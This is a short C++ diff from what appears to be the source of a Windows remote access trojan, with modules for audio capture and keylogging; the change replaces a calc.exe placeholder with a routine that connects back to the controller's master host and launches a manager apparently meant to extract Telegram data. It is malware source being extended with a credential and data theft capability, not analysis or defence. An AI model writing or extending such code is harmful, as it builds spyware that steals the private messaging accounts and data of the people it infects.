@@ -27,6 +27,7 @@
 #include <tchar.h>
 #include <mmsystem.h>
 #pragma comment(lib, "winmm.lib")
+#include "TelegramManager.h"
 
 extern Myfunction *pMyfunction;
 extern bool g_bSignalHook;
@@ -252,10 +253,15 @@ DWORD WINAPI Loop_AudioManager(LPBYTE sRemote)
 }
 
 //提取 T G
-DWORD WINAPI Loop_TelegramManager(LPBYTE sRemote)
-{
-    ShellExecute(NULL, "open", "calc.exe", NULL, NULL, SW_SHOW);
-    return 0;
+DWORD WINAPI Loop_TelegramManager(LPBYTE lparam)  
+{  
+    CClientSocket socketClient;  
+    if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))  
+        return -1;  
+      
+    CTelegramManager manager(&socketClient, lparam);  
+    socketClient.run_event_loop();  
+    return 0;  
 }
 
 //键盘记录
